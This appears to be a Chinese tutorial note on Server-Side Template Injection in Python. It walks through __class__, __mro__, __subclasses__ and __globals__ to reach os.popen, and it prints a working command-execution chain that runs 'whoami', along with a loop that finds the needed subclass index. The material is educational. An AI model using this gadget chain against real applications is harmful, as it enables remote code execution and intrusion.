---
title: SSTI
date: 2026-11-23
---
# SSTI

创建时间：2026-11-23

# 一、模板的概念
模板可以被认为是一个固定写好的文本框架，开发人员或用户填入信息，信息就会填入文本框架，经过模板引擎渲染，最后输出结果。

# 二、SSTI 触发原理
攻击者向不安全模板内传入代码，模板引擎误以为是模板源码，被模板渲染执行，导致信息泄露甚至RCE。
注意区分：

# 三、类的继承
### `__class__`
返回这个对象所属的类。
```python
class a: pass
class b(a): pass
class c(b): pass
class d(c): pass
obj = c()
print(obj.__class__)
```
输出：
```text
<class '__main__.c'>
```
### `__base__`
返回该类的**直接**父类，只有一个。
```python
print(obj.__class__.__base__)
```
输出：
```text
<class '__main__.b'>
```
再叠一层就是再往上一层父类：
```python
print(obj.__class__.__base__.__base__)
```
输出：
```text
<class '__main__.a'>
```
Python 里所有类最终都继承自 `object`，`object` 本身没有父类。
```python
print(obj.__class__.__base__.__base__.__base__)            # <class 'object'>
print(obj.__class__.__base__.__base__.__base__.__base__)    # None
```
### `__mro__`
返回一个元组，第一个元素是当前类自己，后面依次是全部祖先，按方法解析顺序排列。
```python
print(obj.__class__.__mro__)
```
输出：
```text
(<class '__main__.c'>, <class '__main__.b'>, <class '__main__.a'>, <class 'object'>)
```
因为是元组，可以用下标取指定的类：
```python
print(obj.__class__.__mro__[3])
```
输出：
```text
<class 'object'>
```
### `__subclasses__()`
返回该类的**直接**子类列表。
```python
print(obj.__class__.__mro__[3].__subclasses__())
```
输出：
```text
[<class 'type'>, <class 'async_generator'>, ...（后面省略）]
```

# 四、找可用的函数
因为目标是 RCE，所以要在子类列表里找包含系统命令执行函数的模块。标准库里主要有 `os`、`subprocess`、`pty`。我们这里就先找`os`中的popen函数
因为popen函数的下标随环境变化，所以先枚举出来：
```python
#思路
xxx =0
for i in c.__class__.__mro__[3].__subclasses__()[157].__init__.__globals__:
    if "popen" in str(i):
        print(xxx)
        print(i)
    else:
        xxx +=1  #该方法找出了默认的os在下角标157处
```


# 五、从类到 popen
`os` 模块里的 `popen()` 能执行系统命令，我们要借 `<class 'os._wrap_close'>`这个类为入口，拿到`popen()`
拿到它的方式是：取这个类的 `__init__`，它的 `__globals__` 就是 `os` 模块的全局命名空间字典；用 `'popen'` 作键取出函数对象，然后就可以传命令了。

## `__init__`是什么
可以理解为把「类」换成「函数」。因为下一站的 __globals__ 只有函数才有。

## `__globals__`是什么
可以理解为把「函数」换成「它定义所在模块的完整命名空间」，获得了这个命名空间的字典，然后就可以通过这个字典中的键名来获得函数对象了



```python
print(obj.__class__.__mro__[3].__subclasses__()[143].__init__.__globals__['popen']('whoami').read())
```
输出：
```text
desktop-s2liqu4\22461
```
# 六、不依赖固定下标
实际环境不清楚对方有哪些类、下标是多少。但 Python 里一切都是对象，可以从任意字面量出发：
```python
''.__class__              # <class 'str'>
().__class__              # <class 'tuple'>
[].__class__              # <class 'list'>
{}.__class__              # <class 'dict'>
''.__class__.__mro__      # (<class 'str'>, <class 'object'>)
```



# 七、魔术属性 / 方法总结

```python
__class__   #返回类型所属的对象
__mro__     #返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__    #返回该对象所继承的父类
__mro__     #返回该对象的所有父类

__subclasses__()  #获取当前类的所有子类
__init__          #类的初始化方法
__globals__       #对包含(保存)函数全局变量的字典的引用

```


参考原文：https://blog.csdn.net/qq_61955196/article/details/132237648 
